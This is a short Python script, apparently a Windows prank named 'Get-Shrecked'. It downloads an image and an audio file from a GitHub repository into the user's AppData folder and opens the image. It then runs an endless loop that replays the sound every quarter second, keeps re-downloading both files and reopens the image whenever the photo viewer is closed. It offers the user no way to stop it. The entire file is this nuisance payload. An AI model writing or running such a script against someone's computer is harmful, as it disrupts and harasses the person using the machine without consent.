import webbrowser, time, os, urllib.request, getpass, winsound, subprocess
from pathlib import Path
user = getpass.getuser()
urllib.request.urlretrieve("https://github.com/CrazyFox7048/Get-Shrecked/blob/main/get.png?raw=true", filename= "C:\\Users\\"+user+"\\AppData\\Roaming\\get.png")
urllib.request.urlretrieve("https://github.com/CrazyFox7048/Get-Shrecked/blob/main/Donkey.wav?raw=true", filename= "C:\\Users\\"+user+"\\AppData\\Roaming\\donkey.mp3")
image = "C:\\Users\\"+user+"\\AppData\\Roaming\\get.png"
os.startfile(image)
sound = "C:\\Users\\"+user+"\\AppData\\Roaming\\donkey.mp3"
def process_exists(name):
    tasklist = os.popen('tasklist').read()
    if name in tasklist:
        return True
    else:
        return False
while True:
    time.sleep(0.25)
    winsound.PlaySound("C:\\Users\\"+user+"\\AppData\\Roaming\\donkey.mp3", winsound.SND_ASYNC | winsound.SND_ALIAS)
    if os.path.exists(image):
        urllib.request.urlretrieve("https://github.com/CrazyFox7048/Get-Shrecked/blob/main/get.png?raw=true", filename= "C:\\Users\\"+user+"\\AppData\\Roaming\\get.png")
    if os.path.exists("C:\\Users\\"+user+"\\AppData\\Roaming\\donkey.mp3"):
        urllib.request.urlretrieve("https://github.com/CrazyFox7048/Get-Shrecked/blob/main/Donkey.wav?raw=true", filename= "C:\\Users\\"+user+"\\AppData\\Roaming\\donkey.wav")
    if not process_exists("Microsoft.Photos.exe"):
        os.startfile(image)
